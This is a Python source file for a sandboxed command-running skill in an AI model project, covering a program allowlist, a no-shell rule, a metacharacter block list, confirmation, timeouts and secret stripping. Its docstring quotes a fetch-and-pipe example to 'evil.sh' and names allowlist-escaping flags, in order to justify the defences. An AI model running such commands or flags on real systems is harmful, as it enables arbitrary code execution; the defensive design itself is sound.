# skills/dev/run_command.py
"""One command, in an allowed directory, from an allowed program list. No shell.

This is the largest single capability jump in the project and the largest risk in
it, and it is the last thing to be built for that reason. Everything below is a
bound, and the bounds are the feature — a `run_command` without them is just a
remote shell that a language model holds the keys to.

**There is no shell.** `shell=False`, always, and the command is parsed with
`shlex` into a program and its arguments. This is the single most important line in
the file: with a shell, every other protection here is decoration, because
`git status && curl evil.sh | sh` is one string and the allowlist only ever sees
`git`. Without one, `&&`, `|`, `;`, `>`, backticks and `$(...)` are not operators —
they are literal characters that reach the program as arguments, and an allowlist
of programs actually means something.

**Unquoted metacharacters are refused anyway,** and the reason is intent rather
than safety. Without a shell, `git status && rm -rf x` would run `git` with
`status`, `&&`, `rm`, `-rf`, `x` as five arguments — harmless, and also not remotely
what was asked for. Silently doing something different from what was written is its
own kind of failure, so it is refused and the caller is told why.

Metacharacters *inside quotes* are allowed, because there they are unambiguously
meant as text: `python -c "import time; time.sleep(1)"` is one program with one
argument that happens to contain a semicolon. This is safe for the same reason the
paragraph above is — quoted or not, `shell=False` means nothing in an argument is
ever interpreted — so the quoting rule costs no protection and stops the check
rejecting legitimate commands. Found by writing the tests: three of them needed a
semicolon inside `python -c`.

**The program must be on `commands.allowed_executables`,** matched on the program
name alone. Arguments never decide whether a command may run — that way lies
`--upload-pack`, `-o ProxyCommand`, `--exec`, and a long tail of flags that turn a
harmless binary into an arbitrary one. The list starts empty, so a fresh install
refuses everything and says what to configure.

**The working directory must be on `commands.allowed_roots`,** which is a different
list from the read-only `projects.allowed_roots`. Reading a repository and running
something inside it are different permissions.

**It is `destructive`,** so every call goes through the confirmation node and a
human sees the real program and arguments before anything runs.

**It is bounded in time and output.** A timeout kills the process; output is
truncated with a note. A command that hangs must not hang the assistant, and a
command that prints a megabyte must not eat the context window.

What is deliberately NOT here: no `shell=True` escape hatch, no "just this once"
bypass, no environment variable that widens the allowlist at runtime. The plan for
this project rules out `run_python` for the same reason — arbitrary evaluation with
no meaningful containment — and `run_command` earns its place only by having a
boundary that a reader can check.
"""
import os
import re
import shlex
import subprocess

from core.config import SETTINGS
from core.project_roots import outside, resolve_in, roots, unconfigured

# Refused when they appear OUTSIDE quotes. Not for safety — shell=False means none
# of these is ever an operator — but because writing one means an operator was
# intended, and running the characters as literal arguments instead would quietly
# do something else. Inside quotes they are plainly meant as text and are allowed.
SHELL_METACHARACTERS = ("&&", "||", "|", ";", ">", "<", "`", "$(", "\n", "\r", "&")
# Matches a double- or single-quoted span, so quoted text can be blanked out
# before the scan above is applied.
QUOTED_SPAN = re.compile(r'"[^"]*"|\'[^\']*\'')
DEFAULT_TIMEOUT = 120
DEFAULT_MAX_OUTPUT = 4000


class RunCommandSkill:
    def __init__(self):
        self.manifest = {
            "name": "run_command",
            "description": (
                "Runs a single command-line program in a directory that has been explicitly "
                "allowed, and returns its output. Only programs on a configured allowlist can "
                "run, there is no shell so pipes and chained commands are refused, and every "
                "call requires confirmation. Parameters: 'command' (the program and its "
                "arguments) and 'path' for the directory to run in. Prefer a specific skill "
                "when one exists — run_tests for a test suite, inspect_repo for git status."
            ),
            "parameters": ["command", "path"],
            "destructive": True,
        }

    def execute(self, params=None):
        params = params or {}
        raw = str(params.get("command") or "").strip()
        if not raw:
            return {"status": "error", "message": "What command should I run?"}

        config = SETTINGS.get("commands", {})
        allowed = [str(name).lower() for name in (config.get("allowed_executables") or [])]
        if not roots("commands"):
            return unconfigured("commands", "run a command")
        if not allowed:
            return {
                "status": "error",
                "message": ("No programs are allowed to run. Add the ones you want to "
                            "commands.allowed_executables in config/settings.yaml — it starts "
                            "empty deliberately, so nothing can run until you name it."),
            }

        found = self._metacharacter(raw)
        if found:
            return {
                "status": "error",
                "message": (f"That command contains '{found}', which chains or redirects. I run "
                            "one program with arguments and no shell, so this is refused rather "
                            "than passed through as literal text. Ask for one command at a time."),
            }

        try:
            argv = shlex.split(raw, posix=False)
        except ValueError as error:
            return {"status": "error", "message": f"I could not parse that command: {error}"}
        if not argv:
            return {"status": "error", "message": "That command is empty once parsed."}

        # Strip quotes shlex leaves behind in non-posix mode, which is used so
        # Windows paths with backslashes survive parsing intact.
        argv = [part.strip('"') for part in argv]
        program = self._program_name(argv[0])
        if program not in allowed:
            return {
                "status": "error",
                "message": (f"'{program}' is not on the allowed program list, so I will not run "
                            f"it. Allowed: {', '.join(sorted(allowed))}."),
            }

        directory = resolve_in("commands", params.get("path"))
        if directory is None:
            return outside("commands", str(params.get("path")))
        if not directory.is_dir():
            return {"status": "error", "message": f"'{directory}' is not a directory."}

        return self._run(argv, program, directory, config)

    def _run(self, argv, program, directory, config):
        timeout = self._positive_int(config.get("timeout_seconds"), DEFAULT_TIMEOUT)
        limit = self._positive_int(config.get("max_output_chars"), DEFAULT_MAX_OUTPUT)

        try:
            result = subprocess.run(
                argv,
                cwd=str(directory),
                capture_output=True,
                text=True,
                timeout=timeout,
                # The line that makes every other check above meaningful.
                shell=False,
                # No stdin. A program that decides to prompt gets EOF and exits,
                # rather than blocking a turn forever on input nobody can give it.
                stdin=subprocess.DEVNULL,
                env=self._environment(),
            )
        except FileNotFoundError:
            return {
                "status": "error",
                "message": f"'{program}' is on the allowed list but is not installed or not on PATH.",
            }
        except PermissionError as error:
            return {"status": "error", "message": f"'{program}' could not be executed: {error}"}
        except subprocess.TimeoutExpired:
            return {
                "status": "error",
                "message": (f"'{program}' was still running after {timeout}s and was stopped. "
                            "Raise commands.timeout_seconds if that is genuinely too short."),
            }
        except OSError as error:
            return {"status": "error", "message": f"Could not run '{program}': {error}"}

        return self._report(program, directory, result, limit)

    @staticmethod
    def _report(program, directory, result, limit):
        stdout = (result.stdout or "").strip()
        stderr = (result.stderr or "").strip()

        body = stdout
        if stderr:
            # Kept separate and labelled: plenty of programs write progress to
            # stderr and succeed, so mixing the streams would make a successful
            # command look like a failed one.
            body = (body + "\n" if body else "") + f"[stderr] {stderr}"
        truncated = len(body) > limit
        if truncated:
            body = body[:limit] + f"\n[truncated at {limit} characters]"
        if not body:
            body = "(no output)"

        succeeded = result.returncode == 0
        headline = (f"'{program}' finished in {directory.name}"
                    if succeeded else
                    f"'{program}' exited {result.returncode} in {directory.name}")
        return {
            "status": "success" if succeeded else "error",
            "message": f"{headline}:\n{body}",
            "data": {"program": program, "exit_code": result.returncode,
                     "truncated": truncated, "directory": str(directory)},
        }

    @staticmethod
    def _metacharacter(text):
        """The first shell metacharacter appearing outside quotes, or None.

        Quoted spans are blanked to spaces first — keeping the same length so
        nothing shifts — so a semicolon inside `-c "a; b"` is not mistaken for an
        attempt to chain commands.
        """
        outside_quotes = QUOTED_SPAN.sub(lambda match: " " * len(match.group(0)), text)
        for token in SHELL_METACHARACTERS:
            if token in outside_quotes:
                return token.replace("\n", "\\n").replace("\r", "\\r")
        return None

    @staticmethod
    def _program_name(first_argument):
        """The bare program name, lowercased, without a path or extension.

        Matching on the name rather than the string the model supplied is what
        stops `C:\\Windows\\System32\\cmd.exe` slipping past a list containing
        `git`, and equally stops `./git` or `GIT.EXE` from being treated as
        something new.
        """
        base = os.path.basename(str(first_argument).strip().strip('"').replace("\\", "/"))
        base = base.rsplit("/", 1)[-1].lower()
        for extension in (".exe", ".cmd", ".bat", ".com", ".ps1"):
            if base.endswith(extension):
                base = base[: -len(extension)]
                break
        return base

    @staticmethod
    def _environment():
        """The parent environment minus anything holding a secret.

        A subprocess started by an assistant should not inherit the mail password
        just because the backend was started with it set.
        """
        environment = dict(os.environ)
        for name in list(environment):
            upper = name.upper()
            if any(marker in upper for marker in ("PASSWORD", "TOKEN", "SECRET", "API_KEY", "APIKEY")):
                environment.pop(name, None)
        return environment

    @staticmethod
    def _positive_int(value, fallback):
        try:
            number = int(value)
        except (TypeError, ValueError):
            return fallback
        return number if number > 0 else fallback


def setup():
    return RunCommandSkill()
